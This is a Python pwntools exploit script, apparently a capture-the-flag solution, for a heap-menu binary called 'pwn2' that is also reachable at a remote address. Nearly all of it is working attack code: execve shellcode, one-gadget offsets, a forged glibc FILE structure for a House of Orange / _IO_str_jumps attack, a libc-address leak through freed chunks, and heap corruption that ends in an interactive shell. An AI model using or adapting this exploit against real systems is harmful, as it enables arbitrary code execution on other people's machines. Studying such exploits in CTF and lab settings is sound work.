# -*- coding: utf-8 -*-
from pwn import *
# from libformatstr import FormatStr
context.log_level = 'debug'
# context.terminal=['tmux','splitw','-h']
context(arch='amd64', os='linux')
# context(arch='i386', os='linux')
local = 1
elf = ELF('./pwn2')
if local:
    p = process('./pwn2')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#onegadget64(libc.so.6)
#more onegadget
#one_gadget -l 200 /lib/x86_64-linux-gnu/libc.so.6
one64 = [0x45226,0x4527a,0xf0364,0xf1207]
# [rax == NULL;[rsp+0x30] == NULL,[rsp+0x50] == NULL,[rsp+0x70] == NULL]
#onegadget32(libc.so.6) 
# one32 = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]

# py32 = fmtstr_payload(start_read_offset,{xxx_got:system_addr})
# sl(py32)
# py64 = FormatStr(isx64=1)
# py64[printf_got] = onegadget
# sl(py64.payload(start_read_offset))

# shellcode = asm(shellcraft.sh())
shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    file_struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    file_struct = file_struct.ljust(0x88, "\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, "\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, "\x00")
    return file_struct

def pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr):
    payload = pack_file(_flags = 0,
                        _IO_read_ptr = 0x61, #smallbin4file_size
                        _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr,
                        _IO_write_base = 0,
                        _IO_write_ptr = 1,
                        _IO_buf_base = binsh_addr,
                        _mode = 0,
                       )
    payload += p64(_IO_str_jumps_addr-8)  # vtable
    payload += p64(0) # paddding
    payload += p64(system_addr)
    return payload

def get_io_str_jumps_offset(libc):
    IO_file_jumps_offset = libc.sym['_IO_file_jumps']
    IO_str_underflow_offset = libc.sym['_IO_str_underflow']
    for ref_offset in libc.search(p64(IO_str_underflow_offset)):
        possible_IO_str_jumps_offset = ref_offset - 0x20
        if possible_IO_str_jumps_offset > IO_file_jumps_offset:
            # print possible_IO_str_jumps_offset
            return possible_IO_str_jumps_offset

def house_of_orange_payload(libc, libc_base):
  io_str_jump = libc_base + get_io_str_jumps_offset(libc)
  io_list_all = libc_base + libc.symbols['_IO_list_all']
  system = libc_base + libc.symbols['system']
  bin_sh = libc_base + next(libc.search('/bin/sh'))
  payload = pack_file_flush_str_jumps(io_str_jump, io_list_all, system, bin_sh)
  return payload

sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(mallocr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print }}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
    else:
        gdb.attach(p,"b *{}".format(hex(mallocr)))


ru("Please tell your the most important secret")
sl('a'*8)
ru("Welcome to my secret memory")
ru('>> ')
sl('2')
def malloc(index,size,content):
	ru("Your Choice>> ")
	sl('1')
	ru("index>> ")
	sl(str(index))
	ru("size>> ")
	sl(str(size))
	ru("name>> ")
	sd(content)
def free(index):
	ru("Your Choice>> ")
	sl('2')
	ru("index>> ")
	sl(str(index))
def edit(index,content):
	ru("Your Choice>> ")
	sl('3')
	ru("index>> ")
	sl(str(index))
	ru("name>> ")
	sd(content)
def show(index):
	ru("Your Choice>> ")
	sl('5')
	ru("index>> ")
	sl(str(index))

malloc(0,0x88,'a'+'\n')
malloc(1,0x98,'a'+'\n')
malloc(2,0x98,'a'+'\n')
malloc(3,0x88,'a'+'\n')
free(0)
free(2)
free(1)
show(0)
libc_base = u64(rc(6).ljust(8,'\x00'))-0x3c4b78
print "libc_base--->" + hex(libc_base)
malloc_hook = libc_base + libc.sym["__malloc_hook"]
fake_chunk = malloc_hook - 0x23
onegadget = libc_base + one64[2]
realloc = libc_base + libc.sym["realloc"]
free_hook = libc_base + libc.sym["__free_hook"]
system = libc_base + libc.sym["system"]
binsh = libc_base + libc.search("/bin/sh").next()
malloc(4,0x88,'a'+'\n')#0
malloc(5,0xa8,'a'+'\n')#1
malloc(6,0xe8,'a'+'\n')#2
malloc(7,0xe8,'a'+'\n')#2
free(4)
free(6)
# debug(0x0000000000401475,0)
edit(6,house_of_orange_payload(libc,libc_base)[16:]+'\n')
edit(5,'a'*0xa0+p64(0)+p8(0x61))
ru("Your Choice>> ")
sl('1')
ru("index>> ")
sl("10")
ru("size>> ")
sl("300")

p.interactive()